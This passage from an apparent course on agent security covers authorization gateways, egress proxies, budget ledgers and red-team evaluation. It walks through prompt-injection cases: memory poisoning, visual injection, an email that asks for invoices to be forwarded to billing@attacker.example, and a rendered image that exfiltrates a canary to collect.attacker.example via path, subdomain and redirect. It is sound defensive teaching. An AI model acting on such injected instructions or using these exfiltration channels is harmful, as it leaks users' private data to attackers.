| Environment-injected memory poisoning (EC-13) | A web page observed in task A → stored trajectory → action in task B on another site | Per-task, per-site permissions bound what a later task can do | None evaluated. The authors state that the attack bypasses site-scoped permission defenses in principle | Propagate observation provenance into memory and through retrieval. The gateway treats arguments derived from tainted memory (for example a URL) as untrusted. The egress proxy of Lesson 18.5 decides the destination | Tainted memory that personalization needs. Benign-looking actions on an allowed site | Task-A/task-B sandbox sites with a canary URL. Measure navigation to the canary with and without taint and proxy. Adaptive: payload variants under injected failures (dropped clicks, garbled text) |
| Visual prompt injection (EC-14) | Rendered screen content → file, terminal, or browser actions of a computer-use agent | Text-level input filters see every instruction | A defensive system prompt had no consistent effect: it lowered rates in some platform–model pairs and raised them in others | Grant filesystem and terminal capability per task only. Apply the authority gateway to OS-level actions and the egress proxy to uploads | Actions inside the granted capability. Confirmation fatigue | Sandbox page with a rendered instruction to delete or upload a canary file. Measure attempted against dispatched. Adaptive: rendering and placement variants |
| Adaptive injection against detectors and prompt defenses (EC-10, EC-11, EC-3) | Any untrusted source → any sink | A detector's static rate holds under optimization | Eight defenses above 50% ASR under white-box adaptive strings (EC-10). 0.8% of challenge submissions were end-to-end successes, enough for a breach (EC-11) | Do not let a detector decide authority. Keep detectors as depth and put the decision in out-of-band checks | In-scope actions; text-to-text harms that no action check sees | LAB C protocol: same cases for every configuration, undefended adaptive baseline, stated budget and feedback |
| Adaptive attack against an out-of-band policy (EC-12) | Any untrusted source → policy-mediated tool calls | A policy model or monitor cannot itself be steered | One defense held against one hand-crafted adaptive template on a 7B model (25.8% → 4.2% → 2.6% ASR), with utility about 45% → 26% | Policy authoring and provenance assignment are trusted components and must not read untrusted text | An optimized attack on the policy model; a wrong provenance label | Attack the policy layer directly with a stated optimization budget. Report utility beside ASR |

How to read the table:
- **The derived controls share one assumption** (CLM-032): authority is decided by components that read only authenticated principal, task capability, reviewed manifests, and recorded provenance. They never read the untrusted text itself. If provenance is mislabelled, if a reviewed tool is itself malicious, or if the requested task genuinely needs untrusted data to choose the action, the control does not cover the case.
- **Stating that a row's control works under adaptive attack would be a hypothesis, not a result** (**H**, CLM-033). The prediction is that, at matched benign utility, these deterministic checks keep the unauthorized-dispatch rate under adaptive attack below the rate for a detector-only configuration. The measurement is the sandbox test in each row. The falsifier is any adaptive run in which a call outside capability is dispatched, or in which the detector-only configuration reaches an equal or lower rate at equal utility.
- **Numbers in the table are from different papers, agents, denominators, and attack strengths.** They show that each channel exists and what was tried against it. They do not rank the channels.

**Worked Example** (a design walk-through; no measurement):
- *Input.* User request: "Summarize my latest invoice email." The email body contains a sentence asking the assistant to forward all invoices to `billing@attacker.example`. The task capability grants `read_email` on the user's inbox and nothing else.
- *Steps.* The model proposes `send_email(to="billing@attacker.example", …)`. The gateway evaluates, in order:

| Check | Evidence the gateway uses | Decision |
|---|---|---|
| Scope | task capability is `read_email` only | fail: `send_email` not granted |
| Provenance | `to` derives from the email body (untrusted), not from the user query | fail: tainted argument selects the destination |
| Risk | first-seen external domain | confirmation would be required |
| Budget | not reached | — |

- *Result.* The call is denied at the first failing check and the audit record stores all evaluated checks, the principal, and the provenance of `to`. The summary is still produced, because `read_email` is in scope.
- *Interpretation and limits.*
  - The decision used no judgment by the model, so it holds if the model is fully compromised.
  - If the user had asked "forward this invoice to the address in the email", the destination would legitimately come from untrusted data. Then scope passes, provenance fails, and the only remaining control is confirmation, which can be fatigued. This is the "data requires action" case that costs control/data separation its utility.
  - The gateway does not stop the summary itself from repeating the attacker's sentence to the user.

**Knowledge Check:**
1. Map Hardy's compiler/billing-file story onto an email agent.
2. Why is "ask the model whether this action is safe" not an authorization check?
3. A tool server's description is pinned by hash and passes review. Name one attack in the table that still succeeds, and the control that limits its damage.

**Guided Practice:**
Write the gateway policy for a banking agent: capabilities per task type, taint rules per argument, confirmation thresholds, and audit fields.

**Feedback Contract:**
- *Expected Output*:
  - Knowledge Check 1: the agent is the compiler (the deputy), its credential is the ambient privilege, and the injected recipient is the caller-supplied file name.
  - Knowledge Check 2: the model is the component under attack, so its answer is attacker-influenced. An authorization check must use inputs the attacker cannot write.
  - Knowledge Check 3: parameter tampering that stays within the granted scope, or a reviewed description that is malicious but plausible. Per-argument provenance and narrow capability scope limit the damage; pinning only proves the text has not changed since review.
  - Guided Practice: a policy table with one row per tool. Each row gives the capability scope per task type, the arguments that must originate from the user query (recipient account, amount), the confirmation threshold, the ledger limits, and the audit fields: principal, capability, argument provenance, decision, and context hash.
- *Common Failure*: Relying on a system prompt instruction "never send money to strangers", or tainting whole messages instead of individual arguments.
- *Diagnostic Hint*: Which component would still block the action if the model were fully compromised? For each argument, can attacker-written text choose its value?
- *Concept to Revisit*: Authority and effect verification (Module 12, Lesson 12.5); idempotent effects (Module 14, Lesson 14.2).

**Learning Outcome:**
Design authorization that holds when the model is manipulated, map each agent-specific attack channel to the control that would decide its authority, and state what each control does not cover.

*(Effort: 65m instruction, 20m practice)*

---

### Lesson 18.5 — Output Handling, Sandboxing, Egress, and Consumption Limits

**Engineering Question:**
How do we stop model output from becoming code execution, data exfiltration, or resource exhaustion downstream?

**Concepts & Definitions:**
- **Improper output handling**: passing model output to an interpreter without the defenses that input would get. Model output inherits the trust level of whatever influenced it (**D**, CLM-012).
- **Sandbox**: isolated execution for generated code with no ambient credentials, restricted filesystem, CPU/memory/time limits.
- **Egress control**: a policy on *where* a request caused by model output may go. It is enforced by a proxy that is the only network path out of the renderer, the fetch tool, and the code sandbox. The destination, not the shape of the URL, is what the policy authorizes.
- **Unbounded consumption**: loops, oversized contexts, or tool storms that exhaust budget (OWASP LLM10). OWASP's listed mitigations include rate limits and quotas per source entity, timeouts, and throttling (**O**, CLM-022).
- **Cost estimate versus cost bound**: an estimate multiplies typical quantities. A bound holds only when every factor has an enforced maximum, or when a ledger refuses any action whose worst case does not fit.

**Mechanism Explanation:**
Apply the interpreter's standard defense: HTML encoding and CSP for rendering; parameterized queries for SQL; argument arrays not shell strings; sandboxed runners for code (OWASP LLM05 lists context-aware encoding, parameterized queries, and strict CSP; **O**, CLM-022).

*Egress policy proxy* (**D**, CLM-018). The proxy is the control. Query-string stripping is a supplement that narrows one channel. The proxy must enforce, in this order:

1. **Single path.** The renderer's content security policy allows images and fetches only from the proxy origin, and the fetch tool and sandbox have no other route. A URL the proxy never sees is outside the policy.
2. **Authorized destination, decided before any lookup.** Parse the URL once with one parser. Require an allowed scheme and port. Compare the host by exact match against an allowlist of named destinations. Reject user-info, IP literals, and hosts that match only by suffix or substring. The decision comes first because resolving an unauthorized name is already egress: the lookup itself reaches a name server the attacker may run.
3. **Resolution policy.** The proxy resolves allowed names itself, with a resolver the operator controls. It rejects answers in loopback, link-local, private, and metadata ranges, and it connects to the address it checked, so the name cannot resolve differently between check and use.
4. **Redirect policy.** The proxy does not follow redirects automatically. Each `Location` is a new request that goes through steps 2–3, with a small hop limit, or redirects are refused outright.
5. **Request shaping (supplement).** No cookies or credentials, a fixed method, no referrer, and size and content-type limits. Strip the query string, or allow only named parameters, for destinations that do not need it.
6. **Audit.** Record every allow and deny with the principal, the URL as parsed, the resolved address, and the provenance of the content that produced the URL.

These steps follow general server-side request forgery guidance: validate against an allowlist, disable redirect following, and treat name resolution as both a leak to external resolvers and a rebinding risk (**O**, CLM-021). Applying them to rendered model output is this module's derivation.

Why stripping alone fails: the same bytes can be carried in the path, in a subdomain label, or in the target of a redirect issued by a host that is itself allowed. Stripping also does nothing about the fact that a request reached an unauthorized host at all.

*Consumption limits.* AgentDojo's `ToolsExecutionLoop` stops after `max_iters` iterations (default 15). In the same file, `ToolsExecutor.query` runs every tool call present in the assistant message, and nothing there counts tokens or cost (**O**, CLM-014). An iteration cap is therefore not a spend bound: it limits one factor and leaves fan-out, retries, and context size open.

**Quantitative Model / Derivation** (**D**, CLM-017):
The expression $N_{iter}\times(C_{call}+C_{tool})$ "plus context growth" is an **estimate**. It becomes a bound only if every one of these has an enforced maximum:

| Factor | Why the simple product misses it | Enforced maximum |
|---|---|---|
| model calls per episode | — | $N$ |
| input tokens per call | context grows each iteration, so $C_{call}$ is not constant | $T_{in,max}$, checked by exact count before dispatch |
| output tokens per call | — | $T_{out,max}$, the server-enforced output cap |
| tool calls per iteration | one iteration may request many tools | fan-out cap $F$ |
| physical attempts per tool call | SDK retries under the controller | $1+k_s$, counted or disabled |
| price per tool attempt | — | per-attempt cap $c_{tool}$ |

With all six enforced, and prices $p_{in}$, $p_{out}$ per token,

$$
C_{max}=N\,(T_{in,max}\,p_{in}+T_{out,max}\,p_{out})+N\,F\,(1+k_s)\,c_{tool}.
$$

*where:* $N$ is the maximum number of model calls per episode; $T_{in,max}$, $T_{out,max}$ are the per-call input and output token caps; $p_{in}$, $p_{out}$ are USD per token; $F$ is the maximum tool calls per iteration; $k_s$ is the maximum SDK retries per tool call, so $1+k_s$ is the maximum physical attempts; $c_{tool}$ is the maximum price of one attempt. $N_{iter}$, $C_{call}$, $C_{tool}$ in the estimate are typical iterations, typical cost per model call, and typical tool cost per iteration.

*Step-by-step.* (1) One model call costs at most $T_{in,max}p_{in}+T_{out,max}p_{out}$; there are at most $N$ calls. (2) Each iteration follows one model call, so there are at most $N$ iterations, each with at most $F$ tool calls of at most $1+k_s$ attempts at most $c_{tool}$ each: $N\,F\,(1+k_s)\,c_{tool}$. (3) Adding the two worst cases gives $C_{max}$. Every factor is a maximum, so no episode can exceed it; drop any one cap and that factor, hence the product, is unbounded.

*Symbol note.* In this lesson $C$ and $R$ are ledger amounts (committed and reserved USD) and $T_{in}$, $T_{out}$ are token counts; they are unrelated to the events $R$ and $T$ of Lesson 18.2, and $k_s$, $k_c$ are retry counts, not the retrieval top-$k$.

If any one is not enforced, $C_{max}$ is not a bound and must be labelled an estimate. The classification of hard and estimated resources is the one in Module 12, Lesson 12.3: cost is hard only if every billed token is covered by the exact input count and the output cap, and every tool has a per-attempt price cap.

The enforced form is the Module 12 reservation ledger: limit $B$, committed $C$, reserved $R$, invariant $C+R\le B$, reservation of the worst case before dispatch, atomic admission, reconciliation afterwards. Under that invariant, spend is at most $B$ whatever the model proposes.

*How one action is admitted.* Before dispatch, compute the worst-case reservation $q$ of the action. Admit only if $C+R+q\le B$; then $R\leftarrow R+q$. After the action finishes with actual cost $a\le q$: $R\leftarrow R-q$, $C\leftarrow C+a$, and the refund is $q-a$. Since actual spend $C$ never exceeds $C+R$, and $C+R\le B$ at every step, spend stays at most $B$. With two ledgers (episode and principal), the check must pass in both, in one atomic step. Module 18 adds two security requirements that Module 12 does not need:

1. **The ledger key is the authenticated principal.** It comes from the verified session at the gateway. It is never taken from model output, a tool argument, a retrieved document, or a client-supplied field, because attacker-written text can set all of those.
2. **There is a per-principal limit across episodes.** An episode budget alone resets whenever a new episode starts, so an attacker who can trigger episodes multiplies it. Each admission must satisfy the episode ledger and the principal's window ledger (for example, per day) in one atomic step. Parallel episodes of one principal share the same principal ledger. Traffic with no authenticated principal draws from a shared pool with its own limit.

**Worked Example A — an injected fetch loop against the ledger** (synthetic prices and counts, registry CLM-020; not any provider's price list):
- *Input.*
  - Prices: input 3 USD and output 15 USD per million tokens; fetch tool 0.01 USD per physical attempt; the fetch SDK retries up to 2 times, so one logical fetch reserves 3 attempts and 0.03 USD.
  - Caps: $N=5$ model calls, $T_{in,max}=20{,}000$, $T_{out,max}=1{,}000$, $F=3$.
  - Budgets: episode $B_{ep}=0.40$ USD; principal $B_{pr}=1.00$ USD per day, with 0.70 already committed by this principal's earlier episodes today.
  - A retrieved page tells the agent to keep fetching every linked page.
- *Step 1 — estimate against bound.*
  - A typical-case estimate with 4,000 input and 500 output tokens per call and one fetch per iteration: $5\times(0.0195+0.01)=0.1475$ USD. Here $0.0195=4{,}000\times3/10^6+500\times15/10^6=0.012+0.0075$, and $0.01$ is one fetch attempt.
  - The bound under the caps: $5\times(0.060+0.015)+5\times3\times3\times0.01=0.375+0.45=0.825$ USD. Mapping to $C_{max}$: $T_{in,max}p_{in}=20{,}000\times3/10^6=0.060$; $T_{out,max}p_{out}=1{,}000\times15/10^6=0.015$; $N\,F\,(1+k_s)\,c_{tool}=5\times3\times(1+2)\times0.01$.
  - Used as a ceiling, the estimate is 5.6 times too low ($0.825/0.1475\approx5.6$). The bound itself (0.825) is above the episode budget (0.40), so the caps alone do not keep the episode inside its budget. The ledger does.
- *Step 2 — ledger trace.* $C_{ep}$ and $C_{pr}$ are committed cost in USD after the row.
  - *How to read a row.* A model-call reservation is (exact input count) $\times p_{in}$ $+$ $T_{out,max}\times p_{out}$, because input is counted before dispatch but output is known only afterwards. Row 1: $6{,}000\times3/10^6=0.018$ plus $1{,}000\times15/10^6=0.015$, so $q=0.033$. Actual with 400 output tokens: $0.018+400\times15/10^6=0.018+0.006=0.024$; refund $0.033-0.024=0.009$. The "Check" column is $C+R+q$ for the ledger that is closest to its limit, including any still-open reservations (row 6c: $0.9315+0.06+0.03=1.0215$).

| # | Proposed action | Reservation $q$ | Check | Decision | Actual | $C_{ep}$ / $C_{pr}$ |
|---|---|---|---|---|---|---|
| 1 | model call, 6,000 input | $0.018+0.015=0.033$ | principal $0.70+0.033\le1.00$ | ADMIT | 400 output: 0.024; refund 0.009 | 0.024 / 0.724 |
| 2a–c | three fetches in one iteration | 3 attempts, 0.03 each | fan-out $3\le3$; principal $0.724+0.09\le1.00$ | ADMIT all | — | reserved 0.09 |
| 2d | fourth fetch, same iteration | — | fan-out $4>3$ | **REJECT** (fan-out cap) | — | unchanged |
| 2e | fetches finish with 1, 3, and 1 attempts | — | — | reconcile | 5 attempts, 0.05; refund 0.04 | 0.074 / 0.774 |
| 3 | model call, 18,000 input (three pages appended) | $0.054+0.015=0.069$ | principal $0.843\le1.00$ | ADMIT | 600 output: 0.063; refund 0.006 | 0.137 / 0.837 |
| 4 | three fetches | 0.09 | principal $0.927\le1.00$ | ADMIT all | 3 attempts, 0.03; refund 0.06 | 0.167 / 0.867 |
| 5a | model call, 31,000 input | — | $31{,}000>20{,}000$ | **REJECT** (input-token cap) | — | unchanged |
| 5b | same call compacted to 19,000 input | $0.057+0.015=0.072$ | principal $0.939\le1.00$ | ADMIT | 500 output: 0.0645; refund 0.0075 | 0.2315 / 0.9315 |
| 6a | fetch | 0.03 | principal $0.9615\le1.00$ | ADMIT | — | reserved 0.03 |
| 6b | fetch | 0.03 | principal $0.9915\le1.00$ | ADMIT | — | reserved 0.06 |
| 6c | fetch | 0.03 | principal $1.0215>1.00$; episode $0.3215\le0.40$ | **REJECT** (principal budget) | — | unchanged |
| 6d | fetches 6a–b finish with 1 attempt each | — | — | reconcile | 2 attempts, 0.02; refund 0.04 | 0.2515 / 0.9515 |
| 7 | model call, 19,500 input | $0.0585+0.015=0.0735$ | principal $1.025>1.00$; episode $0.325\le0.40$ | **REJECT** (principal budget) | — | unchanged; episode ends `budget_exhausted(principal)` |

- *Result.* Three model calls, 10 fetch attempts, 0.2515 USD in the episode, 0.9515 USD for the principal's day. Four proposed actions were refused before dispatch, each with the resource that failed.
- *Reading the trace as four tests.*
  - **Multi-tool iteration** (rows 2a–2d): one iteration asked for four tools. The simple product assumes one.
  - **Nested retry** (row 2e): one logical fetch used 3 physical attempts. The reservation already covered them. With a controller retry on top ($k_c=2$), one logical fetch could reach $2\times(1+2)=6$ attempts, and each controller attempt needs its own reservation. (Here $k_c=2$ counts controller *attempts*, one original plus one retry. In the $1+k$ convention used for $k_s$, that is one controller retry; the general count is (controller attempts) $\times(1+k_s)$, and with two controller *retries* it would be $3\times3=9$.)
  - **Context growth** (rows 3, 5a, 5b): the input went from 6,000 to 18,000 to 31,000 tokens. The reservation grew with it, and the call that exceeded the token cap was refused, although its cost (0.108 USD) would still have fitted the principal's budget ($31{,}000\times3/10^6+0.015=0.108$; $0.867+0.108=0.975\le1.00$).
  - **Budget rejection** (rows 6c, 7): the episode ledger had room both times. Only the principal ledger stopped the loop.
- *Interpretation and limits.*
  - With an episode-only key, the attacker restarts and receives a fresh 0.40 USD each time: ten episodes are 4.00 USD. With the principal ledger, 0.0485 USD remains for the day ($1.00-0.9515$). A new episode's first call (reservation 0.033) is admitted and its next action is not.
  - If the page had contained text claiming to be a different user, nothing changes. The key was fixed by the gateway from the session before any content was read.
  - The trace bounds cost only. It does not bound wall-clock time or side effects, and it holds across a crash only if the ledger is durable (Module 14).
  - The cost column is hard only because every price in this fixture is capped by a controller-set parameter.

**Worked Example B — egress through a rendered image** (sandbox fixture; reserved names and a canary value, no real secret or endpoint):
- *Input.* A chat UI renders Markdown. An injected page makes the model emit an image reference whose URL points at `collect.attacker.example` and carries a summary of the user's private notes. In the sandbox the notes contain the canary `CANARY-7F3A`. The sandbox resolver and listeners are the only things that answer for `attacker.example` and `cdn.allowed.example`. The allowlist contains `cdn.allowed.example` only.
- *Steps.* Run each case under two configurations and read the sandbox resolver log and listener logs.

| Case | Where the canary is carried | Strip-query-only configuration | Policy proxy (steps 1–6) |
|---|---|---|---|
| E1 | query string, unauthorized host | request reaches the unauthorized listener without the canary | DENY before lookup; no lookup, no connection |
| E2 | path segment, unauthorized host | canary delivered | DENY before lookup |
| E3 | subdomain label, unauthorized zone | canary delivered in the lookup itself | DENY before lookup; resolver log empty for that zone |
| E4 | redirect from the allowed host to the unauthorized host, canary in the target path | canary delivered after the redirect | first hop allowed; redirect target DENY; not followed |
| E5 | path segment, allowed name whose sandbox answer is an internal address | canary delivered to the internal listener | DENY at resolution; connection uses only the checked address |
| E6 | query string, allowed host | canary absent at the allowed listener | same |
| E7 | path segment, allowed host | canary delivered to the allowed listener | **canary delivered to the allowed listener** |
| C0 | benign image, allowed host | renders | renders |
| C1 | E1 with the proxy bypassed (harness check) | — | listener records the canary, proving the harness can detect a leak |

- *Result.* Under the policy proxy, the unauthorized listener and the resolver for the unauthorized zone record zero requests in E1–E5, and C0 still renders. Under strip-query-only, E2–E5 deliver the canary to a destination that was never authorized, and E1 still contacts one.
- *Interpretation and limits.*
  - E1 under strip-only is not a pass. The request itself tells the unauthorized host that the user opened this content, and when.
  - E7 is the residual risk. An allowed destination still receives whatever the path carries. If that destination has attacker-readable storage, logs, or a redirect of its own, data leaves through an authorized door. The allowlist therefore names specific hosts that the operator controls or has reviewed. Path patterns are constrained where the destination permits it.
  - Request count and timing remain a low-bandwidth channel to any allowed host.
  - The proxy governs network egress only. `send_email` and other tool sinks are governed by the gateway of Lesson 18.4.
  - C1 matters: without a control in which the leak is observed, zero requests could mean a broken listener.

**Knowledge Check:**
1. Why is output validation from Module 13 necessary but not sufficient for security?
2. An agent is limited to 15 iterations. Name three reasons its spend is still unbounded.
3. Query strings are stripped from all external image URLs. Give two places the same data can travel instead, and say what stops them.

**Guided Practice:**
1. Recompute Example A with the principal's earlier commitment at 0.50 instead of 0.70. Which rows change?
2. For a code-interpreter tool, specify sandbox isolation, resource limits, filesystem policy, the egress path, and how outputs return to the model.

**Feedback Contract:**
- *Expected Output*:
  - Knowledge Check 1: a schema-valid output can still be a valid request to do the wrong thing. Validation checks form, and the sink needs authorization and encoding.
  - Knowledge Check 2: tool fan-out per iteration, inner retries, and context growth per call. Also output length if uncapped.
  - Knowledge Check 3: path and subdomain label, or a redirect target. Destination authorization before lookup and a redirect policy stop them. Stripping does not.
  - Guided Practice 1: every $C_{pr}$ is 0.20 lower. Row 6c is now admitted (principal $0.7315+0.09=0.8215\le1.00$). Assuming that fetch also takes one attempt, row 6d ends at 0.2615 / 0.7615. Row 7 is admitted: episode $0.2615+0.0735=0.335\le0.40$ and principal $0.835\le1.00$. The loop then runs on until the model-call cap or the episode budget stops it. The fan-out and token-cap rejections (2d, 5a) do not change, because they do not depend on the budget.
  - Guided Practice 2: no ambient credentials, CPU/memory/time limits, a scratch filesystem, network only through the policy proxy, outputs returned as untrusted text.
- *Common Failure*: Sandboxing code but allowing unrestricted network egress; calling an iteration cap a cost ceiling; treating "the proxy strips query strings" as the control; keying the budget by a field the client or the model can set.
- *Diagnostic Hint*: Where can bytes leave the system, including a name lookup? For the ledger: which factor in your ceiling has no enforced maximum, and who decides the key?
- *Concept to Revisit*: Reservation, reconciliation, and refund (Module 12, Lesson 12.3); validation ladder (Module 13, Lesson 13.5).

**Learning Outcome:**
Treat model output as untrusted input, authorize its network destinations with a policy proxy, and bound consumption with a ledger keyed by the authenticated principal.

*(Effort: 65m instruction, 35m practice)*

---

### Lesson 18.6 — Security Evaluation, Red Teaming, and Audit

**Engineering Question:**
What evidence justifies shipping an agent that reads untrusted content?

**Concepts & Definitions:**
- **Benign utility**: fraction of user tasks solved without an attack.
- **Utility under attack**: fraction of security cases—one (user task, injection task) pair—where the user task is solved without adversarial side effects.
- **Targeted ASR**: fraction of security cases where the attacker's goal is met.
- **AgentDojo**: its paper defines these metrics and ships 97 user tasks, 27 injection tasks, and 629 security cases across four suites. Its authors report that strong LLMs fail many tasks even without attack and that its attacks break some but not all security properties (**O**, CLM-013; author-reported, experiment card EC-5).
- **Pareto dominance**: X dominates Y on a declared vector if X is at least as good on every metric and strictly better on at least one. The frontier contains every undominated configuration.
- **Release objective**: a rule declared before reading results, for example metric floors and ceilings followed by one quantity to maximize.
- **Audit trail**: immutable record linking each effect to principal, capability, argument provenance, gateway and proxy decisions, ledger state, and context hash.

**Mechanism Explanation — Pinned AgentDojo Trace (O, CLM-014):**
At `ethz-spylab/agentdojo` commit `089ed468cf3ed0322acc66b0211f26d9d90dbf60` (static inspection on 2026-09-27; every file and symbol below re-read at that commit on 2026-10-01; nothing executed):
1. `benchmark_suite_with_injections` first runs each injection task as a user task, then calls `run_task_with_injection_tasks` for every user task. That function runs each injection task and stores two booleans under `(user task ID, injection task ID)`. `aggregate_results` averages booleans over pairs.
2. `TaskSuite.run_task_with_pipeline` returns `(utility, security)`. `BaseInjectionTask.security` documents `True` as "the injection goal was executed". At this revision the mean field printed as `security` is therefore targeted ASR, not a protection rate.
3. On a context-length or server error, the runner records `utility = False` and `security = True`. How published analysis treats such error pairs was not traced (`TODO_VERIFY`).
4. `PromptInjectionDetector.query` checks trailing tool messages per message or over the full conversation. Detection replaces text with `<Data omitted because a prompt injection was detected>` or raises `AbortAgentError`; `run_task_with_pipeline` catches that error and scores the state reached.
5. `ToolsExecutionLoop.query` repeats while the last assistant message has tool calls, up to `max_iters` (default 15). `ToolsExecutor.query` runs every tool call in that message. These files do not bound tokens or cost.

Lesson: utility and attack success are separate outcomes. An abort can lower ASR and utility together.

**Quantitative Model / Trade-off Comparison** (**D**, CLM-019):
Compare rows only when they share the model and harness manifest, benign task set, security cases, and attack protocol. A static protocol names its fixed attacks. An adaptive protocol names method, queries per case, attacker knowledge, and feedback. Every configuration, including no added defense, gets both columns.

For vector (benign utility ↑, utility under attack ↑, static ASR ↓, adaptive ASR ↓), check dominance pairwise. The arrows give the better direction: ↑ means higher is better, ↓ means lower is better. To check whether X dominates Y, compare each metric in its own direction; X dominates only if it is never worse and at least once strictly better. If several points remain, choose by a predeclared objective. Saying "X dominates" while X is worse on one declared metric is an arithmetic error.

**Worked Example** (synthetic counts, registry CLM-020; no system was measured):
- *Input.* One model and manifest; 100 benign tasks; 400 security cases. Static protocol: fixed templates, one attempt per case. Adaptive protocol: search with 200 queries per case and gateway/detector decisions visible. Objective fixed in advance: benign utility ≥75%, adaptive ASR@200 ≤10%, then maximize utility under attack.

| Config | Benign utility (of 100) | Utility under attack (of 400) | Static ASR (of 400) | Adaptive ASR@200 (of 400) |
|---|---:|---:|---:|---:|
| A — no added defense | 80 (80%) | 180 (45%) | 120 (30%) | 232 (58%) |
| B — abort on detect | 78 (78%) | 120 (30%) | 16 (4%) | 140 (35%) |
| C — gateway with taint rules | 76 (76%) | 280 (70%) | 12 (3%) | 20 (5%) |

- *Step 1 — dominance.* C beats A and B on attack-time utility and both ASRs, but loses on benign utility (76 < 80 and 78). A beats B on utilities and loses on ASRs. No configuration dominates another; all three are on the frontier.
- *Step 2 — objective.* A and B fail the 10% adaptive-ASR ceiling. C passes both constraints and is the only feasible point.
- *Result.* Ship C under this objective, with its cost stated: 4 fewer benign tasks solved than A out of 100.
- *Interpretation and limits.* C is chosen by objective, not dominance. At a benign floor of 78%, nothing is feasible: do not ship under that objective. On a vector that silently drops benign utility, C would dominate; that is a different question. A's adaptive result is required as baseline. The 5% result means only that this search found success on 20 of 400 cases at budget 200; it is no guarantee at a stronger budget. Whether 76 versus 80 is real needs the paired analysis in Module 15.

*Author-reported comparison.* AgentDojo Table 5 reports, for GPT-4o under its built-in static attack, (benign utility, utility under attack, targeted ASR): no defense 69.0/50.0/57.7; delimiting 72.7/55.6/41.7; injection detector 41.5/21.1/8.0; repeated prompt 85.5/67.3/27.8; tool filter 73.1/56.3/6.8 (EC-5). Tool filter dominates no defense, delimiting, and detector on this three-metric vector. Repeated prompt and tool filter trade utility against ASR. This table says nothing about adaptive attack.

**Knowledge Check:**
1. Why must ASR be reported with utility under attack?
2. What audit fields reconstruct why an effect happened?
3. Raise the worked example's benign floor to 78%. What is the decision?
4. At the pinned revision, a run prints `Average security: 6.84%`. Is that good or bad for the defender?

**Guided Practice:**
Design a red-team campaign: scope, authorization, sandbox, static and adaptive protocols, budget, success predicates, undefended baseline, promotion of finds to regressions, and confirmatory sample. Then answer the trace questions in Section 09 from the pinned files; that trace is counted as `source_trace` time.

**Feedback Contract:**
- *Expected Output*:
  - Check 1: refusal of all work can yield low ASR and zero utility.
  - Check 2: principal, capability, tool and arguments with per-argument provenance, gateway/proxy decisions, ledger state, and context hash.
  - Check 3: no feasible configuration; C misses the floor and A/B miss the ASR ceiling.
  - Check 4: `True` means injection success, so 6.84% is ASR. It still needs utility and protocol beside it.
  - Practice: per-pair table, adaptive budget and feedback, no-defense baseline, dominance analysis, objective, promoted regressions, audit schema.
- *Common Failure*: Reporting red-team find count as prevalence; calling C dominant despite its lower benign utility; omitting the adaptive baseline for A.
- *Diagnostic Hint*: Was the attacker allowed to adapt? For each preferred row, name every metric on which it is worse.
- *Concept to Revisit*: Uncertainty and release gates (Module 15, Lesson 15.4); counterexample lifecycle (Module 16, Lesson 16.6).

**Learning Outcome:**
Justify security claims with utility-aware, adaptive, auditable evidence, and select a frontier point by a declared objective.

*(Effort: 60m instruction, 25m practice. The pinned trace is counted once, under `source_trace`.)*

---

## 05 Literature & Production Source Map

Papers quoted with a number were opened in full text (arXiv HTML) on 2026-10-01. Every such number is author-reported. Nothing was reproduced and no benchmark was run. Each experiment card says exactly what was read and measured.

**REFERENCE / BASELINE**
- [The Confused Deputy](https://dl.acm.org/doi/10.1145/54289.871709) — Hardy, 1988. *Scope*: ambient authority and capabilities. Not re-read in this revision.
- [Indirect Prompt Injection](https://arxiv.org/abs/2302.12173) — Greshake et al., 2023. *Scope*: attack class. Not re-read in full; no number retained.
- [Universal and Transferable Adversarial Attacks](https://arxiv.org/abs/2307.15043) — Zou et al., 2023. *Scope*: transfer as evidence that alignment is not a boundary. Not re-read in full; no number retained.
- [PoisonedRAG](https://arxiv.org/abs/2402.07867) — Zou et al.; arXiv v3, 2024; EC-1.
- [AgentDojo](https://arxiv.org/abs/2406.13352) — Debenedetti et al.; arXiv v3, 2024; EC-5. Its built-in attacks are static.
- [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llm-top-10/), [LLM05](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/), [LLM10](https://genai.owasp.org/llmrisk/llm102025-unbounded-consumption/). *Scope*: risk names and listed mitigations; community guidance, not deployment prevalence.
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html). *Scope*: allowlists, redirect handling, and resolution risks behind Lesson 18.5's proxy. Applying it to model-rendered URLs is a derivation.

**RECOMMENDED ENGINEERING BASELINE** (course position, not a surveyed industry default)
- Source–sink models (**D**, CLM-001); per-action authorization with argument provenance (**D**, CLM-010); output encoding, sandboxing, and a destination-enforcing egress proxy (**D**, CLM-012, CLM-018); a reservation ledger keyed by the authenticated principal (**D**, CLM-017); audited effects and utility-aware adaptive evaluation (**D**, CLM-008, CLM-019).

**INDUSTRY PREVALENCE:** not surveyed. No opened source measures how many deployed systems implement this baseline, so no industry-default claim is made (`TODO_VERIFY`). A recommended mitigation is not evidence of adoption. AgentDojo is a benchmark harness, not a production deployment.

**WORKLOAD-DEPENDENT:** [Spotlighting](https://arxiv.org/abs/2403.14720) (Hines et al.; arXiv v1, 2024; EC-2), classifiers as defense in depth, confirmation thresholds, taint granularity, and the utility cost of control/data separation.

**FRONTIER** (as of the sources opened through the 2026-09-30 cutoff; a targeted search, not a survey)
- [CaMeL](https://arxiv.org/abs/2503.18813) — Debenedetti et al.; arXiv v2, 2025; EC-4. *Scope*: control/data separation with its threat model and utility cost.
- [The Attacker Moves Second](https://arxiv.org/abs/2510.09023) — Nasr et al.; arXiv v1, 2025; EC-3. *Scope*: evidence across 12 defenses for adaptive evaluation. It is an author recommendation, not an adopted standard.
- *Agent attack channels, 2025–2026* (all full text; EC-6 to EC-14):
  - Tool metadata: [MCPTox](https://arxiv.org/abs/2508.14925) (Wang et al.; v2, 2026); [When the Manual Lies](https://arxiv.org/abs/2605.24069) (Liu et al.; v1, 2026).
  - Tool selection: [Prompt Injection Attack to Tool Selection in LLM Agents](https://arxiv.org/abs/2504.19793) (Shi et al.; v3, 2025).
  - Memory: [Memory Injection Attacks on LLM Agents via Query-Only Interaction](https://arxiv.org/abs/2503.03704) (Dong et al.; v5, 2026); [Poison Once, Exploit Forever](https://arxiv.org/abs/2604.02623) (Zou et al.; v2, 2026).
  - Visual: [VPI-Bench](https://arxiv.org/abs/2506.02456) (Cao et al.; v2, ICLR 2026).
